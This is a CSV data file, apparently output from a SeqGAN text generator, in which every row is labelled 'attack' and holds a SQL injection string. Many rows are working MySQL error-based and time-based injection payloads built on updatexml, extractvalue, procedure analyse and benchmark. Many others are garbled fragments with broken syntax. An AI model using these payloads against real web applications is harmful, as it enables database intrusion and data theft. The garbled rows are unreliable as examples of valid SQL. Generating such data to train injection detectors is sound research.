attack,",(  (  (  (  =  (  (  (  end  (  (  1808,concat  (  (  (  0x5c,(  =  (  7982,concat  (  (  (  (  1 extractvalue  (  7982,1   )    USR$whenerodea  e  case when   (  5704  (  (  0x5c,0x7171706a71,  (  select   (  (  5000000  (  (  1297,  (  (  benchmark  (  (  benchmark  (  (  5000000(  (  3393  (  0x2e,0x7171706a71,  (  =  (  3393,1   )    )  extractvalue  (",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1251
attack,"1%""  )   or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and   (  ""%py nvgznnzly  0x4b774c75)      )    (  (  extractvalue  (  (  1049  )  (  =  (  (  (  3393,concat' like '  (  5777  (  (  7982  =  (  0x5c,0x7171706a71,1   from dua  elt  (  elt  (  3393  =  3393,1   (  (  elt  (  2917  =  (  3393,  (  (  7982  =  (  (  (  0x2e,concat  (  (  select   (  elt  (  elt  (  1808  =  1808,",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1252
attack,"1%%""  )   or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and   (  ""%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1253
attack,"1%""   )    )     )  extractvalue  (  (  (  (  (  (  9627,concat  (  (  (  (  3393,  (  benchmark  (  2917=  (  9627,concat  (  (  (  1 or extractvalue  (  (   from dual  )  e  =  (  1808,1   )    (  extractvalue  (  2917,md5  (  (  0x5c,  (  (  benchmark  (  (  5000000(  (  0x5c,  (  0x2e,0x7171706a71,  (  1049  (  5000000,md5  (  (  (  0x2e,md5  (",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1254
attack,"1%'  )   or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and   (  '%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1255
attack,"1%""   )    (  extractvalue  (  8862,1extractvalue  (  (  (  (  (  (  (  (  0x2e,0x7171706a71(  (  (  0x2e,0x7171706a71,  (  (  select   (  7982  =  (  (  3393,1   from d5  (  9667  )  (  (  (  select   (  elt  (  0x4b774c75   end  (  elt  (  elt  e  (  0x2e,0x7171706a71,  (  select   (  elt  (  7982  =  (  0x2e,0x7171706a71,  (  benchmark  (  (  5000000,md5  (  (  ",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1256
attack,"1' and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and 'knnA"" like """" or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and ""WHERE1802' or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1257
attack,"1%' or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1258
attack,"1%""   (  )    extractvalue  (  (  (  (  (  (  (  (  7982  (  (  (  (  (  (  3393,concat  (  (  (  (  0x2e,0x7171706a71,  (  (  =  (  9627,concat  (  (  (  =  extractvalue  (  (  benchmark  (  5000000(  (  (  0x2e,md5  (  (  0x2e,0x7171706a71,  (  (  benchmark  (  (  (  5000000,md5  (  (  0x2e,0x7171706a71,  (  select   (  )   (  (  elt  (  elt  (",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1259
attack,"1%"" and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and ""%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1260
attack,"1%""  )   and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and   (  ""%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1261
attack,"1%""  )   or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and   (  ""%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1262
attack,"1%"" or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and ""R""  )   or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and   (  "" %'  =  'k0x717a767a71' or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and '1802el  (  1297  =  (  (  3393,1   )    )    (  2162  =  1  (  US,updatexml_(  (   (    (  (  eltalt  elt  (  1297  =  (  1808,1   )    AND AND when d5  (  0x2e,0x7171706a71,0x7171706a71,  (  (  5000000,md5  (  (  select   (  elt  3393  =  (  (  0x2e,0x7171706a71,  (  select   (  elt  (  7982  =  (  3393,1   )    ",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1263
attack,"1%' procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1264
attack,"1%"" procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1265
attack,"1%   and extractvalue  (  (  (  7982,1   )    1559  US,0x717a767a71extractvalue  (  (  (  0x2e,0x7171706a71(  (  benchmark  (  (  (  (  0x5c,0x7171706a71,  (  (  (  (  (  (  1759,updatexml  (  (  (  (  (  (  (  (  =  (  (  (  50000003393  (  (  (  (  select   (   from (  5322  (  e(  ell  2917  =  (    (  (  (  e  (  (  7982,concat  (  (  (  (  0x5c,  (",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1266
attack,"1%' and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1267
attack,"1%' procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1268
attack,"1%"" and extractvalue  (  (  (  (  (  (  (  1808,concat  (  0x2e,0x7171706a71,  (  (  (  5000000(  (  (  9255,md5  (  (  (  (  0x5c,  (  (  select   (  elt  (  (  elt  (  1808  =  (  0x5c,0x7171706a71,  (  benchmark  (   (  (  (  elt  (  1297  =  (  (  (  0x2e,0x7171706a71,  (  (  select   (  (  elt  (  1808  =  (  7982,1   )    (  extractvalue",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1269
attack,"1%"" and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and ""%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1270
attack,"1%' or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1271
attack,"1"" or extractvalue  (  =  (  )   (  4415  (  (  (  1297,concat  (  (  (  (  (  7982  =  (  9788(  (  9788  (  (  0x5c,0x7171706a71,  (  select   (  5433  (  case when   (  (  case when   (  4660  (  (  0x2e,0x7171706a71,  (  (  select   (  (  el  (  3393  =  (  (  (  0x2e,md5  (  select   (  elt  (  1808  =  (  (  0x2e,0x7171706a71,  (  (  t(  select",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1272
attack,"1%""  )   and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and   (  ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1273
attack,"1%"" or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1274
attack,"1%""  )   or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and   (  ""%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1275
attack,"1"" and extractvalue  (  (  (  (  (  3393,concat  (  0x5c,0x7171706a71,  (  select   (  case d5  )  elt  (  elt  (  1808  =  (  3393,1   )    (  extractvalue  (  9627,m  (  select   (  elt  (  e  (  3393  =  (  9255,concat  (  (  (  0x2e,md5  (  (   (  (  (  0x4b774c75   (  (  (  case when   (  4415  (  (  e  (  3393,1   )    (  extractvalue  (  (",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1276
attack," AND 1 p else cast  (  extractvalue  (  (  (  (  (  3393,md5  =  (  (  0x5c,0x7171706a71,  (  0x2e,0x7171706a71,  (  (  t  (  5000000,md5  (  benchmark  (  (  (  5000000,m(  (  select   (  elt  )  (  select   (  elt  e  (  1808  =  1   (  updatexml  (  (  (  (  7982  (  (  t  (  (  (  0x5c,0x7171706a71,  (  benchmark  (  benchmark  (  (  benchmark  (  (  benchmark",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1277
attack,"1%'  )   or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and   (  '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1278
attack,"1%updatexml  )  select   (  (  case 0 from   (  5433  (  (  eltua  elt  (  1808  =    (  (  3393  (  (  0x2e,md5  (  0x5c,0x7171706a71,  (  (  (  select  (  (  elt  0x4b774c75   end  (  (  elt  (  elt  (  3393  =  8318  (  elt  (  (  3393  (  =  (  ut  (  benchmark  (  benchmark  (  (  benchmark  (  (  5000000(  (  (  0x4b774c75   end  (  ",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1279
attack,"1%' or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1280
attack,"1%""   )    OT0x7171706a71,extractvalue0x78   ( 3863o  (2914  (  5000000,md5  (  (  0x2e,md5  (  0x2e,0x7171706a71,  (  (  benchmark  (  benchmark  (  5000000,md5  (  =  1759,  (  benchmark  (  (  benchmark  (  (  5000000,md5  (  =  3393,  (  (  (  5000000(  (  (  0x2e,0x7171706a71,md5  (  (  0x5c,0x7171706a71,  (  select   (  case 0 0 from(  ual  )   end  (  (  elt  e",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1281
attack,"1%"" procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and ""%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1282
attack,"1%"" or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1283
attack,"1%' and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1284
attack,"1%""   )    (  =  8083  )   or extractvalue  (  (  (  3393,concat  (  (  (  (  =  (  (  3393,1   (  d 0 from dual  )  eysal  )  3539  )  )  )   end  (  (  29176528  )  (  (  0x2e,md5  (  (  0x2e,  (  benchmark  (  (  5000000,md5  (  (  0x2e,1  )  extractvalue  (  (  (  1759,concat  (  (  0x2e,0x7171706a71,  (  5000000,md5  (  ",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1285
attack,"1%"" and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and ""%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1286
attack,"1%"" or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1287
attack,"1"" and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and ""%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1288
attack,"1%""  )   and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and   (  ""%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1289
attack,"""   )    AND 'i'  )  x  (  and extractvalue  (  (  (  3364  (  l  (  (  0x4b774c75   (  6581  (  (  (  0x2e,md5(  0x2e,0x7171706a71,  (  select   (  elt  (  elt  (  5000000,md5  (  (  0x2e,md5  (  extractvalue  (  5000000,md5  (  0x5c,  (  benchmark  (  (  3393,concat  (  (  (  9255,md5  (  (  0x5c,  (  (  (  5000000,md5  (  0x2e,0x7171706a71,  (",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1290
attack,"1%' and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1291
attack,"1%""  )   or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and   (  ""%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1292
attack,"1 and extractvalue  (  (  (  3393,concat  (  (  (  1808  =  (  0x5c,0x7171706a71,0x7171706a71,  (  9788(  (  (  benchmark  (  (  (  (  9627,concat  (  0x2e,0x7171706a71,  (  (  select   (  elt  (  elt  (  eselect 0 dual  )   end  (  (lt  el  (  1297  =  (  (  1759  (  (  (  select   (  elt  6581  =  (  1808,1   from dua  el  (  8862  =  (",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1293
attack,"1%""   )    )     (  extractvalue  3393,  (  (  tl_inadd5  (  e  (  elt  (  0x2e,0x7171706a71,md5  (  (  1808  =  (  2917,concat  (  (  (  (  (  0x2e,  (  select   (  elt  (  elt  (  e0x7171706a71    (  (  0x2e,0x7171706a71,  (  (  benchmark  (  (  5000000,md5  (  2518  =  3393,concat  (  (  (  0x5c,0x7171706a71,  (  select   (  elt  (  0x2e,0x7171706a71,",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1294
attack,1%'  =  ',error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1295
attack,"1%"" and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1296
attack,"1%"" and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1297
attack,"1%' procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1298
attack,"1%""   )    (  extractvalue  (  (  (  1808,concat  (  (  (  (  (  (  =  (  (  (  (  (  (  (  (  (  (  (  17590x7171706a71,m(  (  (  (  0x2e,0x7171706a71,  (  (  5000000(  (  (  1808  =  (  (  0x2e,0x7171706a71,  (  select   (  el  (  3393  =  extractvalue  (  (  (  9627,concat  (  (  0x2e,0x7171706a71,  (  (  select   (  elt  (  7982  =  (  benchmark  (  (  (",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1299
attack,"1 where *,8666  U extractvalue  (  3393,concat  (  0  (  0x5c,0x7171706a71benchmark  (  5000000(  =  (  ut  elt  (  1297  =  (  (  select   (  elt  (  1812  =  2768  (  (  0x5c,  (  (  5000000(  (  select   (  e  (  elt     (  1297  =  (  3393,md5  (  9788,md5  =  (  3393,md5  (  0x2e,md5  (  0x5c,0x7171706a71,  (  select   (  5433  (  (  ",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1300
attack,"1%""  )   and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and   (  ""%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1301
attack,"1%'  )   or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and   (  '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1302
attack,"1%' and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1303
attack,"1%""   )    )    AND 'i'  =  extractvalue  (  (  (  (  (  (  2917,concat  (  (  (  0x2e,0x7171706a71,  (  benchmark  (  (  (  0x5c,0x7171706a71,  (  (  (  (  (  t  (  (  5000000(  (  (  0x2e,0x7171706a71,  (  (  (  (  9627,concat  (  (  (  0x2e,md5  (  0x5c,0x7171706a71,  (  50000000x2e,0x7171706a71,  (  select   (  elt  (  elt  (  0x5c,0x7171706a71,  (  select   (  elt  (  ",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1304
attack,"1%"" and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and ""okpn"" like ""kpw",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1305
attack,"1%'  )   or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and   (  '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1306
attack,"1"" and extractvalue  (  (  (  (  (  (  (  =  (  (  3393,concat  (  (  (  0x2e,0x7171706a71,  (  (  (  select   (  elt  e  (  1759  (  (  (  0x5c,0x7171706a71,  (  (  extractvalue  (  (  5000000,md5  (  0x2e,0x7171706a71,  (  select   (  (  elt  (  elt  (  0x2e,md5  (  ut   (  (  elt  (  7982  =  (  7982  (  select   (  (  elt 0   (",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1307
attack,"1' or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and 'expkjh",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1308
attack,"1"" and extractvalue  (  (  (  (  (  (  (  3393,concat  (  (  =  (  (  1808,1   (  select   (  2501  (  (  (  0x5c,  (  9627,concat  (  (  (  (  0x5c,0x7171706a71,,md5  (  (  0x2e,0x7171706a71,  (  (  (  benchmark  (  (  0x2e,md5  (  (  select   (  elt  (  e  (  3393  =  (  (  (  0x2e,0x7171706a71,  (  5000000(  (    (  (  0x2e,md5  (  =",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1309
attack,"1or updatexml  (  (  7744  (  (  (  (  (  7151  5530  =  (  1297,concat  (  (  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,md5  (  (  1049  =  (  2917,concat  (  (  0x2e,0x7171706a71,  (  (  select   (  case 0 0 0 from d5  (  5847  )   (   and 0   (  5423  5777  (  (  elt  (  0x5c,  (  (  benchmark  (  (  0x2e,0x7171706a71,  (  (  ",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1310
attack,"1%'   )    proce anal  )  elys  (  elt  (  0x2e,0x7171706a71,  (  (  0x2e,0x7171706a71,  (  (  (  select   (  elt  (  elt  1297  =  (  (  0x5c,  (  (  5000000(  (  (  3393,concat  (  (  (  (  0x2e,0x7171706a71,  (  (  5000000,md5  (  0x2e,0x7171706a71,  (  (  select   (  els  (  0x4b774c75   or,  (  (  (  1808  =  (  (  (  0x5c,0x7171706a71",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1311
attack,"1"" and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and ""case%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1312
attack,"1%""  )   or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and   (  ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1313
attack,"1%""   )    )    AND AND d(_named5  (  (  (  t  (  1297  (  =  (  (  3393,1   )    (  extractvalue  (  (  2917,1   )    (  select   (  extractvalue  (  (  9627,concat  (  (  0x2e,0x7171706a71,  (  5000000(  (  0x5c,0x7171706a71,  (  (  (  5000000(  (  0x2e,0x7171706a71,  (  (  benchmark  (  (  select   (  elt  (  elt  (  1759  =  (  9627,concat  (  (  (  0x2e,0x7171706a71",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1314
attack,"1%' and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and '%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1315
attack," 61%%'  )   or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and   (  '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1316
attack,"1' and extractvalue  (  (  (  (  (  (  (  (  (  (  (  (  0x5c,0x7171706a71(  (  (  benchmark  (  (  (  5000000(  (  0x2e,0x7171706a71,  (  benchmark  (  1808  =  (t  (  (  7982,concat  (  (  (  (  (  (  =  (  3393,md5  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  3393,  (  select   (  elt  (  elt  (  elt  (  0x2e,  (  (  select   ",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1317
attack,"1%' and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and '%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1318
attack,"1%""   )    )    OTi"" like ""roiecedure analyse  (  5777  (  0x2e,md5  (  0x2e,0x7171706a71,  (  5000000(  (  0x5c,  (  (  (  select   (  elt  (  elt  0x2e,md5  (  0x5c,md5  (  (  0x5c,  (  (  benchmark  (  (  (  5000000,md5  =  (  3393,1   SELECT 'i'  (  select   (  extractvalue  (  1297,1   )    )    )     (  extractvalue   (  )   (",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1319
attack,"1%""   )    )    AND 'i'  =  extractvalue  (  (  (  9627,concat  (  (  (  0x5c,0x7171706a71,  (  benchmark  (  (  (  (  5000000,0x7171706a71(  (  (  50000007636  (   (  (  (   from d 0from dual  )  elt  el  )  el  )  7636  )  /  (  (  (  (  0x2e,0x7171706a71,  (  select   (  elt  (  elt  (  3393  =  (  0x7171706a71,  (  (  5000000,md5(  0x2e,md5  ",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1320
attack,"1%""  )   and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and   (  ""%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1321
attack,"1%' or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1322
attack,"1%' procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1323
